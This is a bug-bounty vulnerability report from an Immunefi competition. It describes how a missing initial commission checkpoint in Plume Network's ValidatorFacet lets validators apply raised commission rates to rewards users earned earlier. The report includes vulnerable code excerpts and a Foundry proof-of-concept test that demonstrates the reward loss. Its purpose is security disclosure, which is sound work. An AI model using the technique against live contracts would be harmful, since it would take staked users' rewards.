# 52500 sc high missing commission checkpoint initialization leads to retroactive commission theft of user rewards

**Submitted on Aug 11th 2025 at 09:25:12 UTC by @ZeroExRes for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #52500
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/facets/ValidatorFacet.sol>
* **Impacts:** Theft of unclaimed yield

## Description

### Brief / Intro

Validators can retroactively apply higher commission rates to historical rewards due to a missing initial commission checkpoint in `addValidator()`. When users claim rewards that accrued during periods with lower commission rates, the system incorrectly applies the current commission rate to the entire historical period, resulting in permanent theft of user funds.

### Vulnerability Details

`addValidator()` in `ValidatorFacet.sol` creates initial reward rate checkpoints but fails to create an initial commission checkpoint:

```solidity
function addValidator(...) {
    validator.commission = commission;
    
    // Creates reward checkpoints but NOT commission checkpoint
    for (uint256 i = 0; i < rewardTokens.length; i++) {
        PlumeRewardLogic.createRewardRateCheckpoint($, token, validatorId, currentGlobalRate);
    }
    // MISSING: PlumeRewardLogic.createCommissionRateCheckpoint($, validatorId, commission);
}
```

The function that queries historical commission rates, when it finds no commission checkpoints, falls back to the validator's current commission value:

```solidity
function getEffectiveCommissionRateAt(..., uint256 timestamp) internal view returns (uint256) {
    // ... checkpoint search logic ...
    
    // VULNERABILITY: Falls back to CURRENT commission rate for ANY timestamp
    uint256 fallbackComm = $.validators[validatorId].commission;
    return fallbackComm;
}
```

This allows a validator to set an initial commission (or default) and later increase the commission; because no initial checkpoint exists, all historical reward calculations that probe past timestamps will see the new (higher) commission and apply it retroactively.

### Illustrative exploitation scenario

{% stepper %}
{% step %}

### Validator created with 0% commission

A validator is added with commission set to 0% but no commission checkpoint is recorded.
{% endstep %}

{% step %}

### Users stake and rewards accumulate

Users stake with this validator and rewards accrue over time (under the expectation of 0% commission).
{% endstep %}

{% step %}

### Validator increases commission

The validator increases commission to, e.g., 50% — this action creates the first commission checkpoint.
{% endstep %}

{% step %}

### Users claim historical rewards but lose funds

When users later claim rewards that accrued during the earlier period, the contract queries historical commission rates but finds no checkpoint for that earlier period and falls back to the current commission (50%). The claim incorrectly takes 50% of past rewards.
{% endstep %}
{% endstepper %}

### Impact Details

Direct loss of user reward funds. Affects all users who staked with validators before their first commission change. The longer the delay between validator creation and the first commission change, the greater the potential theft.

## Proof of Concept

Add the following test to `PlumeStakingDiamond.t.sol` to reproduce:

```solidity
function testCommissionCheckpointVulnerability() public {
        // Add validator with 0% commission
        uint16 validatorId = 100;
        address validatorAdmin = makeAddr("validatorAdmin100");
        
        vm.startPrank(admin);
        ValidatorFacet(address(diamondProxy)).addValidator(
            validatorId,
            0, // 0% commission initially
            validatorAdmin,
            validatorAdmin,
            "0x123",
            "0x456",
            address(0x1234),
            1_000_000e18
        );
        
        // Set up PLUME reward rate for predictable calculation
        address[] memory tokens = new address[](1);
        tokens[0] = PLUME_NATIVE;
        uint256[] memory rates = new uint256[](1);
        rates[0] = 1e18; // 1 PLUME per second
        RewardsFacet(address(diamondProxy)).setRewardRates(tokens, rates);
        vm.stopPrank();
        
        // User stakes with the 0% commission validator
        uint256 stakeAmount = 10 ether;
        vm.startPrank(user1);
        StakingFacet(address(diamondProxy)).stake{value: stakeAmount}(validatorId);
        vm.stopPrank();
        
        // Time passes - rewards should accumulate with 0% commission
        vm.warp(block.timestamp + 100); // 100 seconds
        
        // Validator increases commission to maximum allowed
        vm.startPrank(validatorAdmin);
        ValidatorFacet(address(diamondProxy)).setValidatorCommission(
            validatorId,
            50e16 // 50% commission (maximum allowed)
        );
        vm.stopPrank();
        
        // User claims rewards - should get rewards based on historical 0% commission
        // but will get them based on current 50% commission due to the bug
        vm.startPrank(user1);
        uint256 balanceBefore = user1.balance;
        RewardsFacet(address(diamondProxy)).claim(PLUME_NATIVE, validatorId);
        uint256 balanceAfter = user1.balance;
        uint256 actualReward = balanceAfter - balanceBefore;
        vm.stopPrank();
        
        // Calculate expected reward
        uint256 timeDelta = 100; // seconds
        uint256 rate = 1e18; // PLUME per second
        uint256 grossReward = (stakeAmount * timeDelta * rate) / 1e18; // = 1000e18
        uint256 expectedWithZeroCommission = grossReward; // Should get full amount
        uint256 actualWithBuggyFiftyCommission = grossReward / 2; // Actually gets 50%
        
        console2.log("Gross reward for period:", grossReward);
        console2.log("Expected with 0% commission:", expectedWithZeroCommission);
        console2.log("Actual reward received:", actualReward);
        console2.log("Loss due to vulnerability:", expectedWithZeroCommission - actualReward);
        
        // Demonstrate the vulnerability: user loses 50% of rightful rewards
        // because historical period incorrectly uses current 50% commission
        assertApproxEqAbs(
            actualReward,
            actualWithBuggyFiftyCommission,
            1e15, // Small tolerance
            "VULNERABILITY: Historical rewards calculated with current commission rate instead of 0%"
        );
    }
```

## References

* Target source: <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/facets/ValidatorFacet.sol>

***

If you want, I can propose a minimal patch (code snippet) to ensure an initial commission checkpoint is created in `addValidator()` and adjust `getEffectiveCommissionRateAt()` fallback behavior to avoid using the current commission for past timestamps.
